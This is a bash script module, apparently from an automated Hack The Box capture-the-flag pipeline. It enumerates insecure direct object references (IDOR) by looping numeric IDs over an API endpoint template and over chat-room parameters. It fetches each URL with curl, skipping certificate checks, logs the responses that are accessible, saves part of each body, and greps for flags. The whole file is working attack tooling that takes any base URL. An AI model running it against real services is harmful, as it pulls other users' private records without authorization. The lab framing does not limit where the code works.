#!/bin/bash
# idor-enum.sh - IDOR enumeration and exploitation
# Source from pipeline.sh: source ./idor-enum.sh
#
# Functions:
#   idor_enumerate <base_url> <endpoint_template> <start> <end>
#   idor_check_response <response_body> <keyword>

idor_enumerate() {
    local base="$1"
    local template="$2"
    local start="${3:-1}"
    local end="${4:-50}"

    if [ -z "$base" ] || [ -z "$template" ]; then
        log "  [-] Usage: idor_enumerate <base_url> <endpoint_template_with_ID> [start] [end]"
        log "  [-] Example: idor_enumerate http://target /api/users/ID 1 100"
        return 1
    fi

    log "  [*] IDOR enumerating $start-$end on $template"

    for id in $(seq "$start" "$end"); do
        local url="${template//ID/$id}"
        local full_url="${base}${url}"
        local code=$(curl -sko /dev/null -w "%{http_code}" "$full_url" 2>/dev/null)
        local body=$(curl -sk "$full_url" 2>/dev/null)

        if [ "$code" = "200" ] && [ "${#body}" -gt "5" ]; then
            log "  [+] IDOR: $full_url (HTTP $code, ${#body} bytes)"

            # Check for flag in body
            local flag=$(echo "$body" | grep -oE 'HTB\{[^}]+\}' | head -1)
            [ -n "$flag" ] && flag_found "$flag"

            # Save for later analysis
            echo "=== $full_url ===" >> "$STATE/idor_finds.txt"
            echo "$body" | head -c 300 >> "$STATE/idor_finds.txt"
            echo "" >> "$STATE/idor_finds.txt"
        fi
    done
}

idor_enumerate_chat() {
    local base="$1"

    log "  [*] IDOR enumerating chat rooms..."
    for rid in $(seq 1 20); do
        local body=$(curl -sk "$base/chat/?rid=$rid" 2>/dev/null)
        local flag=$(echo "$body" | grep -oE 'HTB\{[^}]+\}' | head -1)
        [ -n "$flag" ] && flag_found "$flag"
        [ "${#body}" -gt 100 ] && log "  [+] Chat room $rid accessible (${#body} bytes)"
    done
}
